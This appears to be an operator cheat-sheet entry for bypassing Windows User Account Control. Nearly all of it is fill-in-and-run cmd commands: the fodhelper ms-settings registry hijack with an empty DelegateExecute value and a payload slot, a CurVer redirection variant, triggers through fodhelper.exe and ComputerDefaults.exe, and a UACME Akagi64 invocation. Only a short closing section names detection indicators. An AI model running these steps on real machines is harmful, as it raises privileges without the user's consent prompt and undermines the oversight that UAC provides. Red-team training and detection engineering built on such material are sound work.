---
technique: UAC
category: privilege-escalation
targets: Windows Workstation, Windows Server
protocols: Local
remote_capable: false
tags: windows uac privilege-escalation registry fodhelper computerdefaults
---

# UAC

UAC bypasses target medium-integrity administrator sessions and attempt to spawn a high-integrity process without a normal consent flow. These entries assume the current user is already a local administrator running with a filtered token.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Admin membership | The current user must be in the local Administrators group |
| Integrity level | The current process usually starts at medium integrity |
| UAC policy | Always Notify and hardened enterprise policy may block common auto-elevate paths |

## Windows

### Check UAC prompt policy

#cmd #registry #uac

Read the administrator consent prompt policy.

```cmd title:"Check UAC administrator prompt policy"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```
<!-- cheat -->

### Check local admin token

#cmd #uac

Check whether the current token includes the local Administrators group.

```cmd title:"Check current token groups"
whoami /groups
```
<!-- cheat -->

### Create fodhelper handler key

#cmd #registry #fodhelper

Create the per-user ms-settings handler key used by fodhelper.

```cmd title:"Create fodhelper handler key"
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f
```
<!-- cheat -->

### Add DelegateExecute value

#cmd #registry #fodhelper

Add the empty DelegateExecute value required by the classic fodhelper hijack.

```cmd title:"Add fodhelper DelegateExecute value"
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
```
<!-- cheat -->

### Set fodhelper command

#cmd #registry #fodhelper

Set the command that fodhelper should run in a high-integrity context.

```cmd title:"Set fodhelper command handler"
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

### Trigger fodhelper

#cmd #fodhelper

Launch fodhelper to resolve the hijacked handler.

```cmd title:"Trigger fodhelper auto-elevation"
fodhelper.exe
```
<!-- cheat -->

### Set CurVer command

#cmd #registry #fodhelper

Point a custom extension handler at a command for the CurVer variant.

```cmd title:"Set CurVer extension command"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /ve /t REG_SZ /d "$command" /f
```
<!-- cheat
var command
-->

### Redirect ms-settings CurVer

#cmd #registry #fodhelper

Redirect ms-settings to the custom extension handler.

```cmd title:"Redirect ms-settings CurVer"
reg add "HKCU\Software\Classes\ms-settings" /v CurVer /t REG_SZ /d ".thm" /f
```
<!-- cheat -->

### Trigger ComputerDefaults

#cmd #computerdefaults

Launch ComputerDefaults to test the same ms-settings handler class.

```cmd title:"Trigger ComputerDefaults auto-elevation"
ComputerDefaults.exe
```
<!-- cheat -->

### Run UACME method

#cmd #uacme

Run a selected UACME method from a medium-integrity administrator shell.

```cmd title:"Run selected UACME method"
Akagi64.exe $method_id
```
<!-- cheat
var method_id
-->

### Cleanup fodhelper keys

#cmd #registry #cleanup

Remove the per-user ms-settings handler keys after testing.

```cmd title:"Remove fodhelper handler keys"
reg delete "HKCU\Software\Classes\ms-settings" /f
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows-local UAC checks and bypass triggers.

## Detection

Watch for writes under `HKCU\Software\Classes\ms-settings`, `DelegateExecute`, `CurVer`, and auto-elevated children of fodhelper.exe or ComputerDefaults.exe.
